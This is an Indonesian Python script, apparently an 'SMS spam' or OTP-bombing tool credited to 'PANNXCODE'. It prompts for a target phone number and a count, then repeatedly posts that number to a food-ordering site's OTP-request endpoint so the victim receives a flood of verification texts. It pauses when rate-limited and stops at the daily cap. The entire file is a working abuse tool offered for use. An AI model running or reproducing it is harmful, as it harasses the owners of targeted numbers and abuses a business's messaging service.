# USAHA WOEEEEE, JANGAN RECODE MULU NGTD
# YG MAU RECODE IJIN DULU TOD. KALO GAK KENA KARMA LOH NANTI

import requests, os, sys, json, time
r = requests.Session()
hd = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
class w:
 m = '\033[1;31m' # merah
 b = '\033[1;34m' # biru
 k = '\033[1;33m' # kuning
 h = '\033[1;32m' # hijau
 u = '\033[1;35m' # ungu
 p = '\033[1;37m' # putih
 i = '\033[1;90m' # abu abu
 ut = '\033[1;34m' # ungu tua
 tm = '\x1b[103m\x1b[31m' # tebal merah (background kuning)
 df = '\x1b[0m'
 c = '\033[1;96m' # cyan
class eek:
 def tunggu(t):
  while t:
   wd=f'\r{w.b}[{w.m}!{w.b}] {w.p}Jeda selama {w.m}'+str(t)+f' {w.p}detik '
   print(wd,end='\r',flush=True)
   time.sleep(1)
   t -= 1
class main:
 def __init__():
     try:
      os.system("clear")
      main.spam()
     except requests.exceptions.ConnectionError:
      print (f"{w.b}[{w.h}X{w.b}] {w.m}Jaringan tidak memadai!!!")
     except KeyboardInterrupt:
      print (f"{w.b}[{w.h}X{w.b}] {w.h}Selamat tinggal!!")

 def spam():
     print(f"""
\033[1;37m       AUTHOR\033[1;31m :\033[1;32m .#D PANNXCODE
\033[1;34m╭╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╮
\033[1;31m        ╔╦╗╔═╗╦═╗╦╔═╔╦╗╔═╗╔═╗╔╦╗
         ║║╠═╣╠╦╝╠╩╗ ║ ║╣ ╠═╣║║║
        ═╩╝╩ ╩╩╚═╩ ╩ ╩ ╚═╝╩ ╩╩ ╩
\033[1;34m╰╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╯
""")
     spam = input(f'{w.b}[{w.h}•{w.b}]{w.p} NOMOR  TARGET{w.m} >{w.k} ')
     if (spam == '') or (len(spam) < 5):
      main.spam()
     else:
      jum = int(input(f'{w.b}[{w.h}•{w.b}]{w.p} JUMLAH SPAM{w.m}   > {w.k}'))
      print(f'{w.k}╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍')
      data = {'phone':spam}
      for spem in range(jum):
       start = r.post('https://member.makanklik.com/data/get_data?func=reqOTP',headers=hd,data=data).text
       jsn = json.loads(start)
       if jsn["status"] == 'ok':
        print (f"{w.b}[{w.h}•{w.b}]{w.p} SUCCES {w.m}{spam}")
       if jsn["status"] == 'failed_interval':
        eek.tunggu(60)
       if jsn["status"] == 'failed_max_day':
        print (f"{w.b}[{w.h}•{w.b}]{w.p} NO{w.b} {spam}{w.p} MENCAPAI LIMIT HARIAN!!")
        exit()
       else:
        pass

if __name__ == "__main__":
 main.__init__()
